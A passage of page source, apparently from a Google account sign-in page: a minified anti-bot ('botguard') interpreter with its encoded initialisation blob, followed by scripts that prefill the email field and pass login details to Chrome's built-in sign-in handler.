X>>=(P=X&(1<<h)-(p-=h,1),h),P}),Y)(3)+1,Y)(5),[]),B=0);K<l;K++)D=Y(1),u.push(D),B+=D?0:1;for(B=(V=[],(B-1).toString(2).length),K=0;K<l;K++)u[K]||(V[K]=Y(B));for(K=0;K<l;K++)u[K]&&(V[K]=L.T());for(e=[],K=t;K--;)e.push(L.w(L.T()));I(L,h,function(L,h,P,X,p){for(X=0,P=[],L.s++,h=[];X<l;X++){if(!u[p=V[X],X]){for(;p>=h.length;)h.push(L.T());p=h[p]}P.push(p)}L.C=L.L(e.slice(),L.T),L.g=L.L(P,L.T)})}),function(L,h){(h=L.w(L.T()),w)(L,h)})),function(L){A(L,1)})),I(L,232,0),64),function(L,h,X,p){if(h=L.V.pop()){for(X=L.T();0<X;X--)p=L.T(),h[p]=L.H[p];(h[84]=(h[189]=L.H[189],L.H)[84],L).H=h}else I(L,102,L.U.length)}),61),function(L,h,X){(h=L.T(),X=L.T(),h=L.w(h),I)(L,X,r(h))}),I)(L,254,L),29),function(L){A(L,2)}),I(L,167,function(L,h){(h=L.T(),L=L.w(h),L[0]).removeEventListener(L[1],L[2],false)}),137),N(4)),94),0),function(L,h,X,p){(h=L.T(),X=L.T(),p=L.T(),h=L.w(h)==L.w(X),I)(L,p,+h)})),L).l=[],[]),function(L,h,X,p,Y){0!==(p=(Y=(p=(h=L.T(),X=L.T(),L).T(),h=L.w(h),L).w(L.T()),X=L.w(X),L.w(p)),h)&&(p=R(L,p,Y,1,h,X),h.addEventListener(X,p,f),I(L,114,[h,X,p]))})),function(L,h,X,p){(p=(X=(h=L.T(),L.T()),L.T()),I)(L,p,L.w(h)>>X)})),I)(L,187,0),I)(L,83,function(L,h,X){I(L,(h=L.T(),X=L.T(),X),L.w(X)+L.w(h))}),function(L,h,X,p,Y,t){if(!q(L,1,255)){if(p=(h=(p=(h=L.T(),X=L.T(),L).T(),Y=L.T(),L).w(h),X=L.w(X),L).w(p),L=L.w(Y),"object"==r(h)){for(t in Y=[],h)Y.push(t);h=Y}for(Y=(t=h.length,0);Y<t;Y+=p)X(h.slice(Y,Y+p),L)}})),L),114,0),I(L,190,function(L,h,X){q(L,1,5)||(h=L.T(),X=L.T(),I(L,X,function(L){return eval(L)}(L.w(h))))}),I(L,115,function(L,h,X,p){p=(h=L.T(),X=L.T(),L).T(),L.w(h)[L.w(X)]=L.w(p)}),163),function(L,h,X,p){p=(h=L.T(),X=L.T(),L.T()),I(L,p,L.w(h)||L.w(X))}),function(L,h,X,p){I(L,(h=(p=(X=(h=L.T(),L.T()),L).T(),X=L.w(X),L.w(h)),p),h[X])})),I)(L,81,function(L){A(L,4)}),L),26,function(L){L.M&&C(L,0)}),84),2048),I(L,200,function(L,h,X){h=(h=L.T(),X=L.T(),L).H[h]&&L.w(h),I(L,X,h)}),L),117,{}),O)),I)(L,1,function(L,h,X){(h=L.T(),X=L.T(),0)!=L.w(h)&&I(L,102,L.w(X))}),130),function(L,h){q(L,1,5)||(h=z(L),I(L,h.m,h.v.apply(h.S,h.B)))}),[])),function(L){L.W(4)})),I)(L,127,function(L){S(L,1)}),L),59,function(L,h,X,p,Y){I((Y=(p=(X=(h=L.T(),L).T(),L.w(L.T())),L.w(L.T())),X=L.w(X),L),h,R(L,X,p,Y))}),272)),I(L,226,function(L){S(L,4)}),[165,0,0])),I(L,27,function(L,h,X,p,Y,t,l){q(L,1,5)||(h=z(L),p=h.S,Y=h.v,X=h.B,l=X.length,0==l?t=new p[Y]:1==l?t=new p[Y](X[0]):2==l?t=new p[Y](X[0],X[1]):3==l?t=new p[Y](X[0],X[1],X[2]):4==l?t=new p[Y](X[0],X[1],X[2],X[3]):G(L,22),I(L,h.m,t))}),I)(L,104,function(){}),L.M=false,[])),188),function(L,h,X,Y,Z,t,l){if((Y=(X=(h=L.T(),T)(L),""),L).H[66])for(Z=L.w(66),t=0,l=Z.length;X--;)t=(t+T(L))%l,Y+=p[Z[t]];else for(;X--;)Y+=p[L.T()];I(L,h,Y)}),L),166,function(L,h,X){(h=L.T(),X=L.T(),I)(L,X,""+L.w(h))}),I)(L,135,function(L,h,X,p,Y){for(Y=(h=L.T(),X=T(L),p=[],0);Y<X;Y++)p.push(L.T());I(L,h,p)}),X).D||function(){},L),205,function(L,h,X,p){I((X=(h=L.T(),L).T(),p=L.T(),L),p,(L.w(h)in L.w(X))+0)}),h&&"!"==h.charAt(0)?(L.$=h,Y()):(L.U=[],X=!!X.D,L.M=X,g(L,[4,h]),g(L,[5,Y]),y(L,false,X,true))},M=function(L,h,X,p){try{for(p=0;79669387488!=p;)L+=(h<<4^h>>>5)+h^p+X[p&3],p+=2489668359,h+=(L<<4^L>>>5)+L^p+X[p>>>11&3];return[L>>>24,L>>16&255,L>>8&255,L&255,h>>>24,h>>16&255,h>>8&255,h&255]}catch(Y){throw Y;}},c=function(L,h,X,p,Y){if((L.Y=false,X=h[0],1)==X)L.A=25,L.J(h);else if(2==X){p=(X=h[1],h)[3];try{L.M=false,Y=L.J(h)}catch(P){d(L,P),Y=L.$}(X&&X(Y),p).push(Y)}else if(3==X)L.J(h);else if(4==X)L.J(h);else if(5==X)h=h[1],L.M=false,h();else if(6==X)return Y=h[2],I(L,176,h[6]),I(L,117,Y),L.J(h)},n=function(L,h,X){return k(L,((X=L.w(102),L.U&&X<L.U.length)?(I(L,102,L.U.length),w(L,h)):I(L,102,h),X))},N=function(L,h){for(h=[];L--;)h.push(255*Math.random()|0);return h},Q=function(L,h){try{m(this,L,h)}catch(X){d(this,X)}},q=(Q.prototype.J=(Q.prototype.we=(Q.prototype.h=((Q.prototype.O=false,Q.prototype).X=(Q.prototype.HB=function(L,h,X,p){try{p=L[(h+2)%3],L[h]=L[h]-L[(h+1)%3]-p^(1==h?p<<X:p>>>X)}catch(Y){throw Y;}},"toString"),36),function(L,h,X){if(3==L.length){for(X=0;3>X;X++)h[X]+=L[X];for(L=[(X=0,13),8,13,12,16,5,3,10,15];9>X;X++)h[3](h,X%3,L[X])}}),function(L,h,X,p,Y){if(4==(h=L[0],h)){L=L[1];try{for(p=h=(X=atob(L),L=[],0);p<X.length;p++)Y=X.charCodeAt(p),255<Y&&(L[h++]=Y&255,Y>>=8),L[h++]=Y;this.U=L}catch(P){G(this,17,P)}k(this)}else if(1==h)X=L[2],Y=L[1],X.push(this.w(19).length,this.w(137).length,this.w(86).length,this.w(84)),this.M=Y,I(this,117,L[3]),this.H[39]&&n(this,this.w(39));else{if(2==h){if(L=(((h=(Y=((L=a(this.w((X=L[2],19)).length+2,2),Y=this.w(189),0<Y.length)&&E(this,19,a(Y.length,2).concat(Y),15),this).w(232)&511,Y-=this.w(19).length+5,this).w(137),4<h.length&&(Y-=h.length+3),0)<Y&&E(this,19,a(Y,2).concat(N(Y)),10),4<h.length&&E(this,19,a(h.length,2).concat(h),153),Y=N(2).concat(this.w(19)),Y[1]=Y[0]^3,Y)[3]=Y[1]^L[0],Y[4]=Y[1]^L[1],window).btoa){for(p=0,h="";p<Y.length;p+=8192)h+=String.fromCharCode.apply(null,Y.slice(p,p+8192));L=L(h).replace(/\+/g,"-").replace(/\//g,"_").replace(/=/g,"")}else L=void 0;if(L)L="!"+L;else for(L="",h=0;h<Y.length;h++)p=Y[h][this.X](16),1==p.length&&(p="0"+p),L+=p;return I(this,84,((Y=L,this.w(19).length=X[0],this.w(137).length=X[1],this.w(86)).length=X[2],X[3])),Y}if(3==h)n(this,L[1]);else if(6==h)return n(this,L[1])}}),function(L,h,X){if(0>=L.I||1<L.s||!L.Y&&0<h||0!=document.hidden||L.i()-L.N<L.I-X)return false;return C(L,(L.R=true,h)),true}),W=(Q.prototype.eK=O.requestIdleCallback?function(L){requestIdleCallback(L,{timeout:4})}:O.setImmediate?function(L){setImmediate(L)}:function(L){setTimeout(L,0)},function(L,h){return L[h]<<24|L[h+1]<<16|L[h+2]<<8|L[h+3]}),d=(Q.prototype.lg=function(L,h,X,p,Y,P){for(P=p=(X=[],0);P<L.length;P++)for(Y=Y<<h|L[P],p+=h;7<p;)p-=8,X.push(Y>>p&255);return X},Q.prototype.W=function(L,h,X,p){((X=(X=(h=L&4,L&=3,this.T()),p=this.T(),this.w(X)),h)&&(X=H((""+X).replace(/
/g,"
"))),L&&E(this,p,a(X.length,2)),E)(this,p,X)},function(L,h){L.$=("E:"+h.message+":"+h.stack).slice(0,2048)}),g=(Q.prototype.K=function(L,h,X,p,Y,P){if(this.$)return this.$;try{P=[],Y=[],p=!!L,g(this,[1,p,Y,h]),g(this,[2,L,Y,P]),y(this,false,p,true),X=P[0]}catch(v){d(this,v),X=this.$,L&&L(X)}return X},Q.prototype.b="caller",function(L,h){L.l.splice(0,0,h)}),z=((Q.prototype.w=function(L,h){if((h=this.H[L],void 0)===h)throw G(this,30,0,L),this.o;return h()},((Q.prototype.CM=function(L,h,X,p){for(;X--;)102!=X&&231!=X&&h.H[X]&&(h.H[X]=h[p](h[L](X),this));h[L]=this},Q.prototype).F=(Q.prototype.pM=function(L,h,X){return(h^=h<<13,h^=h>>17,(h=(h^h<<5)&X)||(h=1),L)^h},35),Q).prototype).o={},function(L,h,X,p,Y,P){for((h={},X=L.T(),h).m=L.T(),h.B=[],p=L.T()-1,Y=L.T(),P=0;P<p;P++)h.B.push(L.T());for(h.v=L.w(X),h.S=L.w(Y);p--;)h.B[p]=L.w(h.B[p]);return h}),A=(Q.prototype.T=function(L,h){if(this.C)return L=L?this.C().shift():this.g().shift(),this.C().length||this.g().length||(this.g=this.C=void 0,this.s--),L;if(L=this.w(102),!(L in this.U))throw G(this,31),this.o;return(I(((void 0==this.f&&(this.f=W(this.U,L-4),this.P=void 0),this.P)!=L>>3&&(this.P=L>>3,h=[0,0,0,this.w(187)],this.c=M(this.f,this.P,h)),this),102,L+1),this).U[L]^this.c[L%8]},function(L,h,X,p){for(X=L.T(),p=0;0<h;h--)p=p<<8|L.T();I(L,X,p)}),r=(Q.prototype.i=(window.performance||{}).now?function(){return this.TN+(window.performance.now()|0)}:function(){return+new Date},function(L,h,X){if(h=typeof L,"object"==h)if(L){if(L instanceof Array)return"array";if(L instanceof Object)return h;if((X=Object.prototype.toString.call(L),"[object Window]")==X)return"object";if("[object Array]"==X||"number"==typeof L.length&&"undefined"!=typeof L.splice&&"undefined"!=typeof L.propertyIsEnumerable&&!L.propertyIsEnumerable("splice"))return"array";if("[object Function]"==X||"undefined"!=typeof L.call&&"undefined"!=typeof L.propertyIsEnumerable&&!L.propertyIsEnumerable("call"))return"function"}else return"null";else if("function"==h&&"undefined"==typeof L.call)return"object";return h}),w=(Q.prototype.UC=function(L,h,X,p,Y){for(Y=p=0;Y<L.length;Y++)p+=L.charCodeAt(Y),p+=p<<10,p^=p>>6;return(p=(L=(p+=p<<3,p^=p>>11,p+(p<<15)>>>0),new Number(L&(1<<h)-1)),p)[0]=(L>>>h)%X,p},function(L,h){(L.V.push(L.H.slice()),L.H[102]=void 0,I)(L,102,h)}),R=(U=O.botguard||(O.botguard={}),function(L,h,X,p,Y,P){return function(){var v=[6,h,X,void 0,Y,P,arguments],J=p&1;if(p&2)var F=y(L,(g(L,v),true),false,false);else J&&L.l.length?g(L,v):J?(g(L,v),y(L,true,false,false)):F=c(L,v);return F}});(U.FKa=function(L,h,X){this.invoke=(X=new Q(L,{D:h}),function(L,h,P){return P=X.K(h&&L,P),L&&!h&&L(P),P})},U).bg=function(L,h,X){return L&&L.substring&&(X=U[L.substring(0,3)])?new X(L.substring(3),h):new U.FKa(L,h)};try{U.u||(O.addEventListener("unload",function(){},f),U.u=1)}catch(L){}try{O.addEventListener("test",null,Object.defineProperty({},"passive",{get:function(){f={passive:true}}}))}catch(L){};')();</script>
  <script type="text/javascript" nonce="">
  document.bg = new botguard.bg('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');
  </script>
<script nonce="">
  gaia = window.gaia || {};
  gaia.ps = gaia.ps || {};
  gaia.ps.hasPrefilledIdentifier = false;
  function gaia_parseFragment() {
  var hash = location.hash;
  var params = {};
  if (!hash) {
  return params;
  }
  var paramStrs = decodeURIComponent(hash.substring(1)).split('&');
  for (var i = 0; i < paramStrs.length; i++) {
      var param = paramStrs[i].split('=');
      params[param[0]] = param[1];
    }
    return params;
  }

  function gaia_prefillEmail() {
    var email = null;
    var form = null;
    if (document.getElementById) {
      email = document.getElementById('Email');
      form = document.getElementById('gaia_loginform');
    }
    if (form && email && (email.value == null || email.value == '')
        && (email.type != 'hidden')) {
      hashParams = gaia_parseFragment();
      if (hashParams['Email'] && hashParams['Email'] != '') {
        email.value = hashParams['Email'];
      }
    }
  }

  
  try {
    gaia_prefillEmail();
  } catch (e) {
  }
  
</script>
<script nonce="">
  var gaia_scrollToElement = function(element) {
  var calculateOffsetHeight = function(element) {
  var curtop = 0;
  if (element.offsetParent) {
  while (element) {
  curtop += element.offsetTop;
  element = element.offsetParent;
  }
  }
  return curtop;
  }
  var siginOffsetHeight = calculateOffsetHeight(element);
  var scrollHeight = siginOffsetHeight - window.innerHeight +
  element.clientHeight + 0.02 * window.innerHeight;
  window.scroll(0, scrollHeight);
  }
</script>
<script nonce="">
(function() {
  var $ = function(id) { return document.getElementById(id); };
  var gaiaLoginForm = $('gaia_loginform');
  var chromeExt = 'chrome-extension://mfffpogegjflfpflabcdkioaeobkgjik';
  var chromeSigninUrl = 'chrome://chrome-signin';
  var chromeOsUrl = 'chrome://oobe';
  var chromeWebview = undefined;
  onMessage = function(e) {
  if (e.origin == chromeSigninUrl || e.origin == chromeOsUrl) {
  chromeWebview = e.source;
  }
  };
  window.addEventListener('message', onMessage);
  gaia_onChromeLoginSubmit = function(e) {
  if (!chromeWebview && window == window.parent) {
  return;
  }
  if (gaiaLoginForm['Email'] && gaiaLoginForm['Passwd']) {
  var checkboxElement = $('advanced-box');
  var chooseWhatToSync = checkboxElement && checkboxElement.checked;
  var attemptToken = new Date().getTime();
  var msg = {method: 'attemptLogin',
  email: gaiaLoginForm['Email'].value,
  password: gaiaLoginForm['Passwd'].value,
  attemptToken: attemptToken,
  chooseWhatToSync: chooseWhatToSync};
  if (chromeWebview) {
  chromeWebview.postMessage(msg, chromeSigninUrl);
  } else {
  window.parent.postMessage(msg, chromeExt);
  }
  console.log('Credentials sent');
  var continueUrlElement = gaiaLoginForm['continue'];
  if (continueUrlElement) {
  var prevAttemptIndex = continueUrlElement.value.indexOf('?attemptToken');
  if (prevAttemptIndex != -1) {
  continueUrlElement.value = continueUrlElement.value.substr(
  0, prevAttemptIndex);
  }
  continueUrlElement.value += '?attemptToken=' + attemptToken;
  }
  }
  };
  gaia_attachEvent(gaiaLoginForm, 'submit', gaia_onChromeLoginSubmit);
})();
</script>
<script type="text/javascript" nonce="">
var BrowserSupport_={IsBrowserSupported:function(){var agt=navigator.userAgent.toLowerCase();var is_op=agt.indexOf("opera")!=-1;var is_ie=agt.indexOf("msie")!=-1&&document.all&&!is_op;var is_ie5=agt.indexOf("msie 5")!=-1&&document.all&&!is_op;var is_mac=agt.indexOf("mac")!=-1;var is_gk=agt.indexOf("gecko")!=-1;var is_sf=agt.indexOf("safari")!=-1;if(is_ie&&!is_op&&!is_mac){if(agt.indexOf("palmsource")!=
